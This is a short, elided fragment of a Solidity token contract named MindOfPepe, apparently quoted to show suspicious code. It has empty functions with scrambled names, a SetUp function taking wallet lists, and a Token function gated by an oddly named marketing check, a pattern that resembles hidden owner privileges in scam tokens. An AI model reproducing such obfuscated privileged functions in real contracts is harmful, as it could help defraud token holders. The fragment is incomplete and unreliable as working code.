...
contract MindOfPepe is Ownable {
    ...
    function atstartfor() public {
    }
    function fortostart() external {
    }
    function fromstartat() public {
    }
    function atstartfrom() public {
    }
    function SetUp(address[] calldata walletAddress) external {
    ...
    function Token(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
